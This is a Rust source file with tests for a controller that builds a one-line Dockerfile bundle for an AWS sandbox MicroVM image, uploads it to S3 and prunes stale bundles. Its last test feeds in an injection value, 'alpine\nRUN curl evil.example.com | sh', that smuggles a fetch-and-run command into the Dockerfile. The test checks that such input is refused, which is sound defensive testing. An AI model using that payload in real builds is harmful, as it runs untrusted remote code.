//! The bundle a Live AWS sandbox's MicroVM image is built from, rendered by its own controller.
//!
//! `CreateMicrovmImage` builds from a zip holding a Dockerfile, read from S3 in the image's own
//! region. The release's image already carries the agent, its contract and the original command,
//! so the Dockerfile is one `FROM` line. It is written to the deployment's bundle Storage, which
//! setup creates; this controller only writes and deletes its own keys there.

use alien_aws_clients::s3::{ObjectIdentifier, PutObjectRequest, S3Api};
use alien_error::{AlienError, Context};
use tracing::{info, warn};

use crate::error::{ErrorData, Result};

use alien_aws_clients::sandbox_bundle::sandbox_prefix;
pub(crate) use alien_aws_clients::sandbox_bundle::RenderedBundle;

/// Renders the bundle that builds `image`.
pub(crate) fn render(bucket: &str, image: &str, resource_id: &str) -> Result<RenderedBundle> {
    alien_aws_clients::sandbox_bundle::render(bucket, image, resource_id).map_err(|message| {
        AlienError::new(ErrorData::ResourceConfigInvalid {
            message,
            resource_id: Some(resource_id.to_string()),
        })
    })
}

/// Writes the bundle, then deletes this sandbox's other bundles except `serving`, the one its
/// active image was built from.
///
/// Only the write can fail the step. A bundle left behind changes no build, and the next write or
/// the sandbox's delete lists the prefix and removes it.
pub(crate) async fn write(
    client: &dyn S3Api,
    bundle: &RenderedBundle,
    serving: Option<&str>,
    resource_id: &str,
) -> Result<()> {
    client
        .put_object(&PutObjectRequest {
            bucket: bundle.bucket.clone(),
            key: bundle.key.clone(),
            body: bundle.zip.clone(),
            content_type: Some("application/zip".to_string()),
            content_md5: None,
            server_side_encryption: None,
            storage_class: None,
        })
        .await
        .context(ErrorData::CloudPlatformError {
            message: format!("Failed to write the sandbox bundle '{}'", bundle.uri()),
            resource_id: Some(resource_id.to_string()),
        })?;
    prune(client, bundle, serving, resource_id).await;
    Ok(())
}

/// Deletes this sandbox's bundles other than `bundle` and `serving`, the one its active image was
/// built from. A failure is logged: the next write or the sandbox's delete removes what is left.
pub(crate) async fn prune(
    client: &dyn S3Api,
    bundle: &RenderedBundle,
    serving: Option<&str>,
    resource_id: &str,
) {
    let serving = serving.and_then(|uri| uri.strip_prefix(&format!("s3://{}/", bundle.bucket)));
    if let Err(error) = delete_keys(client, &bundle.bucket, resource_id, |key| {
        key != bundle.key && Some(key) != serving
    })
    .await
    {
        warn!(sandbox_id = %resource_id, bucket = %bundle.bucket, %error, "Left stale sandbox bundles for the next write or delete");
    }
}

/// Deletes every bundle this sandbox wrote, once nothing can build from them.
pub(crate) async fn delete_all(client: &dyn S3Api, bucket: &str, resource_id: &str) -> Result<()> {
    delete_keys(client, bucket, resource_id, |_| true).await
}

async fn delete_keys(
    client: &dyn S3Api,
    bucket: &str,
    resource_id: &str,
    stale: impl Fn(&str) -> bool,
) -> Result<()> {
    let failed = || ErrorData::CloudPlatformError {
        message: format!("Failed to delete stale sandbox bundles from '{bucket}'"),
        resource_id: Some(resource_id.to_string()),
    };
    let mut continuation = None;
    loop {
        let page = match client
            .list_objects_v2(bucket, Some(sandbox_prefix(resource_id)), continuation)
            .await
        {
            Ok(page) => page,
            // A bucket that is already gone holds no bundles.
            Err(error)
                if matches!(
                    error.error,
                    Some(alien_client_core::ErrorData::RemoteResourceNotFound { .. })
                ) =>
            {
                return Ok(());
            }
            Err(error) => return Err(error).context(failed()),
        };
        let keys = page
            .contents
            .into_iter()
            .filter(|object| stale(&object.key))
            .map(|object| ObjectIdentifier {
                key: object.key,
                version_id: None,
            })
            .collect::<Vec<_>>();
        if !keys.is_empty() {
            let deleted = client
                .delete_objects(bucket, &keys, true)
                .await
                .context(failed())?;
            if let Some(error) = deleted.errors.first() {
                return Err(AlienError::new(ErrorData::CloudPlatformError {
                    message: format!(
                        "Failed to delete the sandbox bundle '{}' from '{bucket}': {}",
                        error.key, error.message
                    ),
                    resource_id: Some(resource_id.to_string()),
                }));
            }
            info!(sandbox_id = %resource_id, %bucket, count = keys.len(), "Deleted stale sandbox bundles");
        }
        match page.next_continuation_token.filter(|_| page.is_truncated) {
            Some(token) => continuation = Some(token),
            None => return Ok(()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dockerfile(bundle: &RenderedBundle) -> String {
        let mut archive =
            zip::ZipArchive::new(std::io::Cursor::new(&bundle.zip)).expect("a zip archive");
        assert_eq!(archive.len(), 1, "the archive holds the Dockerfile alone");
        let mut contents = String::new();
        std::io::Read::read_to_string(
            &mut archive.by_name("Dockerfile").expect("at the root"),
            &mut contents,
        )
        .expect("reads");
        contents
    }

    /// The key is the content's digest: the same image renders the same key, so an unchanged
    /// release rebuilds nothing, and a new image (a new agent or a new base) renders a new one.
    #[test]
    fn the_key_follows_the_image_and_nothing_else() {
        let image = "123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/agents@sha256:aaaa";
        let first = render("p-sandbox-bundles", image, "agents").unwrap();
        let again = render("p-sandbox-bundles", image, "agents").unwrap();
        let next = render(
            "p-sandbox-bundles",
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/agents@sha256:bbbb",
            "agents",
        )
        .unwrap();

        assert_eq!(first, again);
        assert_ne!(first.key, next.key);
        assert!(first.key.starts_with("sandbox-bundle/agents/"));
        assert_eq!(dockerfile(&first), format!("FROM {image}\n"));
    }

    /// Teardown can reach a sandbox whose bundle bucket is already gone; that leaves nothing to
    /// delete, while any other failure to list still stops the delete.
    #[tokio::test]
    async fn deleting_from_a_missing_bucket_succeeds_and_other_failures_do_not() {
        use alien_aws_clients::s3::MockS3Api;
        use alien_client_core::ErrorData as CloudError;

        let mut gone = MockS3Api::new();
        gone.expect_list_objects_v2()
            .times(1)
            .returning(|bucket, _, _| {
                Err(AlienError::new(CloudError::RemoteResourceNotFound {
                    resource_type: "Bucket".into(),
                    resource_name: bucket.to_string(),
                }))
            });
        gone.expect_delete_objects().never();
        delete_all(&gone, "p-sandbox-bundles", "agents")
            .await
            .expect("a missing bucket holds no bundles");

        let mut denied = MockS3Api::new();
        denied
            .expect_list_objects_v2()
            .times(1)
            .returning(|bucket, _, _| {
                Err(AlienError::new(CloudError::RemoteAccessDenied {
                    resource_type: "Bucket".into(),
                    resource_name: bucket.to_string(),
                }))
            });
        delete_all(&denied, "p-sandbox-bundles", "agents")
            .await
            .expect_err("a bucket that cannot be listed may still hold bundles");
    }

    /// Once the bundle is written the build can go ahead: failing to clear the old ones leaves
    /// them for the next write or the delete, which list the prefix again.
    #[tokio::test]
    async fn a_written_bundle_stands_when_the_old_ones_cannot_be_cleared() {
        use alien_aws_clients::s3::{MockS3Api, PutObjectOutput};
        use alien_client_core::ErrorData as CloudError;

        let bundle = render(
            "p-sandbox-bundles",
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/agents@sha256:aaaa",
            "agents",
        )
        .unwrap();
        let mut s3 = MockS3Api::new();
        s3.expect_put_object().times(1).returning(|_| {
            Ok(PutObjectOutput {
                e_tag: None,
                version_id: None,
                server_side_encryption: None,
            })
        });
        s3.expect_list_objects_v2()
            .times(1)
            .returning(|bucket, _, _| {
                Err(AlienError::new(CloudError::RemoteAccessDenied {
                    resource_type: "Bucket".into(),
                    resource_name: bucket.to_string(),
                }))
            });
        write(&s3, &bundle, None, "agents")
            .await
            .expect("the bundle is written");

        let mut refused = MockS3Api::new();
        refused.expect_put_object().times(1).returning(|request| {
            Err(AlienError::new(CloudError::RemoteAccessDenied {
                resource_type: "Object".into(),
                resource_name: request.key.clone(),
            }))
        });
        refused.expect_list_objects_v2().never();
        write(&refused, &bundle, None, "agents")
            .await
            .expect_err("a bundle that was not written fails the step");
    }

    /// The same once the old bundles are listed but their delete fails, whether S3 refuses the whole
    /// request or one key. The serving bundle and the new one are never offered for deletion.
    #[tokio::test]
    async fn a_failing_stale_bundle_delete_does_not_fail_the_write() {
        use alien_aws_clients::s3::{
            DeleteObjectsOutput, ErrorObject, ListObjectsV2Output, MockS3Api, Object,
            PutObjectOutput,
        };
        use alien_client_core::ErrorData as CloudError;

        let bundle = render(
            "p-sandbox-bundles",
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/agents@sha256:bbbb",
            "agents",
        )
        .unwrap();
        let serving = "sandbox-bundle/agents/serving/bundle.zip";
        let stale = "sandbox-bundle/agents/stale/bundle.zip";

        for whole_request_fails in [true, false] {
            let mut client = MockS3Api::new();
            let written = bundle.key.clone();
            client
                .expect_put_object()
                .times(1)
                .withf(move |request| request.key == written)
                .returning(|_| {
                    Ok(PutObjectOutput {
                        e_tag: None,
                        version_id: None,
                        server_side_encryption: None,
                    })
                });
            let listed = [bundle.key.clone(), serving.to_string(), stale.to_string()];
            client
                .expect_list_objects_v2()
                .times(1)
                .returning(move |bucket, _, _| {
                    Ok(ListObjectsV2Output {
                        contents: listed
                            .iter()
                            .map(|key| Object {
                                key: key.clone(),
                                last_modified: String::new(),
                                e_tag: String::new(),
                                size: 0,
                                storage_class: String::new(),
                            })
                            .collect(),
                        name: bucket.to_string(),
                        max_keys: 1000,
                        key_count: 3,
                        is_truncated: false,
                        next_continuation_token: None,
                    })
                });
            client
                .expect_delete_objects()
                .times(1)
                .withf(move |_, keys, _| {
                    keys.iter().map(|k| k.key.as_str()).collect::<Vec<_>>() == [stale]
                })
                .returning(move |bucket, keys, _| {
                    if whole_request_fails {
                        Err(AlienError::new(CloudError::RemoteAccessDenied {
                            resource_type: "Bucket".into(),
                            resource_name: bucket.to_string(),
                        }))
                    } else {
                        Ok(DeleteObjectsOutput {
                            deleted: Vec::new(),
                            errors: vec![ErrorObject {
                                key: keys[0].key.clone(),
                                code: "InternalError".into(),
                                message: "We encountered an internal error.".into(),
                            }],
                        })
                    }
                });

            write(
                &client,
                &bundle,
                Some(&format!("s3://p-sandbox-bundles/{serving}")),
                "agents",
            )
            .await
            .expect("the bundle was written; a stale one left behind changes no build");
        }
    }

    #[test]
    fn a_reference_that_would_write_directives_is_refused() {
        for image in [
            "",
            "alpine\nRUN curl evil.example.com | sh",
            "alpine latest",
        ] {
            render("p-sandbox-bundles", image, "agents")
                .expect_err(&format!("{image:?} must not reach a Dockerfile"));
        }
    }
}
